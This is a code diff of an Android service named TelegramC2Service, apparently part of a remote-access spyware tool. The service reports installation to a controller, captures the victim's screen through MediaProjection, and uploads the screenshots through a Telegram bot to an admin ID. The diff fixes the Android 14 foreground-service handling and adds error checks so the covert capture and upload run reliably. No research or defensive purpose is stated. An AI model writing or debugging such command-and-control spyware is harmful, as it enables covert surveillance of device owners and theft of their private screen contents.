@@ -30,6 +30,7 @@ import java.io.FileOutputStream;
 import java.nio.ByteBuffer;
 
 public class TelegramC2Service extends Service {
+
     private Thread workerThread;
     private static final String CHANNEL_ID = "chimeraChannel";
     private static final int NOTIFICATION_ID = 1;
@@ -43,7 +44,6 @@ public class TelegramC2Service extends Service {
     @Override
     public void onCreate() {
         super.onCreate();
-
         try {
             ConfigLoader.load(this);
             sendInstallMessage();
@@ -53,13 +53,8 @@ public class TelegramC2Service extends Service {
 
         createNotifChannel();
 
-        // ⚡ FIX: Start foreground service with correct type immediately
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) { // API 34
-            startForeground(NOTIFICATION_ID, createNotification(),
-                    ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION);
-        } else {
-            startForeground(NOTIFICATION_ID, createNotification());
-        }
+        // ⚡ Start foreground service safely with normal types
+        startForeground(NOTIFICATION_ID, createNotification());
 
         try {
             startWorker();
@@ -144,7 +139,7 @@ public class TelegramC2Service extends Service {
 
     private void prepareAndLaunchScreenshot() {
         try {
-            // ⚡ Already promoted in onCreate(), no need to startForeground again
+            // Just launch the ScreenshotActivity; mediaProjection permission will be requested there
             Intent intent = new Intent(this, ScreenshotActivity.class);
             intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
             startActivity(intent);
@@ -155,63 +150,76 @@ public class TelegramC2Service extends Service {
 
     private void handleScreenshotResult(int resultCode, Intent data) {
         try {
+            if (data == null) return;
+
             MediaProjectionManager projectionManager = (MediaProjectionManager)
                     getSystemService(Context.MEDIA_PROJECTION_SERVICE);
+
             mediaProjection = projectionManager.getMediaProjection(resultCode, data);
-            if (mediaProjection != null) {
-                captureScreenshot();
+            if (mediaProjection == null) return;
+
+            // ⚡ Promote service to mediaProjection type now, after permission
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
+                startForeground(NOTIFICATION_ID, createNotification(),
+                        ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION);
             }
+
+            captureScreenshot();
         } catch (Exception e) {
             ErrorLogger.logError(this, "HandleScreenshotResult", e);
         }
     }
 
     private void captureScreenshot() {
-        WindowManager windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
-        DisplayMetrics metrics = new DisplayMetrics();
-        windowManager.getDefaultDisplay().getRealMetrics(metrics);
-        int width = metrics.widthPixels;
-        int height = metrics.heightPixels;
-        int density = metrics.densityDpi;
+        try {
+            WindowManager windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
+            DisplayMetrics metrics = new DisplayMetrics();
+            windowManager.getDefaultDisplay().getRealMetrics(metrics);
+            int width = metrics.widthPixels;
+            int height = metrics.heightPixels;
+            int density = metrics.densityDpi;
 
-        imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);
-        virtualDisplay = mediaProjection.createVirtualDisplay(
-                "ScreenCapture",
-                width, height, density,
-                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
-                imageReader.getSurface(), null, screenshotHandler
-        );
+            imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2);
+            virtualDisplay = mediaProjection.createVirtualDisplay(
+                    "ScreenCapture",
+                    width, height, density,
+                    DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
+                    imageReader.getSurface(), null, screenshotHandler
+            );
 
-        imageReader.setOnImageAvailableListener(reader -> {
-            Image image = null;
-            try {
-                image = reader.acquireLatestImage();
-                if (image != null) {
-                    Image.Plane[] planes = image.getPlanes();
-                    ByteBuffer buffer = planes[0].getBuffer();
-                    int pixelStride = planes[0].getPixelStride();
-                    int rowStride = planes[0].getRowStride();
-                    int rowPadding = rowStride - pixelStride * width;
+            imageReader.setOnImageAvailableListener(reader -> {
+                Image image = null;
+                try {
+                    image = reader.acquireLatestImage();
+                    if (image != null) {
+                        Image.Plane[] planes = image.getPlanes();
+                        ByteBuffer buffer = planes[0].getBuffer();
+                        int pixelStride = planes[0].getPixelStride();
+                        int rowStride = planes[0].getRowStride();
+                        int rowPadding = rowStride - pixelStride * width;
 
-                    Bitmap bitmap = Bitmap.createBitmap(width + rowPadding / pixelStride, height,
-                            Bitmap.Config.ARGB_8888);
-                    bitmap.copyPixelsFromBuffer(buffer);
+                        Bitmap bitmap = Bitmap.createBitmap(width + rowPadding / pixelStride, height,
+                                Bitmap.Config.ARGB_8888);
+                        bitmap.copyPixelsFromBuffer(buffer);
 
-                    File outputFile = new File(getExternalFilesDir(null), "screenshot.jpg");
-                    try (FileOutputStream fos = new FileOutputStream(outputFile)) {
-                        bitmap.compress(Bitmap.CompressFormat.JPEG, 90, fos);
+                        File outputFile = new File(getExternalFilesDir(null), "screenshot.jpg");
+                        try (FileOutputStream fos = new FileOutputStream(outputFile)) {
+                            bitmap.compress(Bitmap.CompressFormat.JPEG, 90, fos);
+                        }
+
+                        TelegramBotWorker.uploadFile(outputFile.getAbsolutePath(),
+                                ConfigLoader.getAdminId(), "Screenshot", this);
+                        stopScreenshot();
                     }
-
-                    TelegramBotWorker.uploadFile(outputFile.getAbsolutePath(),
-                            ConfigLoader.getAdminId(), "Screenshot", this);
-                    stopScreenshot();
+                } catch (Exception e) {
+                    ErrorLogger.logError(this, "ScreenshotCapture", e);
+                } finally {
+                    if (image != null) image.close();
                 }
-            } catch (Exception e) {
-                ErrorLogger.logError(this, "ScreenshotCapture", e);
-            } finally {
-                if (image != null) image.close();
-            }
-        }, screenshotHandler);
+            }, screenshotHandler);
+        } catch (Exception e) {
+            ErrorLogger.logError(this, "CaptureScreenshot_Init", e);
+        }
     }
 
     private void stopScreenshot() {
@@ -233,7 +241,9 @@ public class TelegramC2Service extends Service {
     }
 
     @Override
-    public IBinder onBind(Intent intent) { return null; }
+    public IBinder onBind(Intent intent) {
+        return null;
+    }
 
     @Override
     public void onTaskRemoved(Intent rootIntent) {
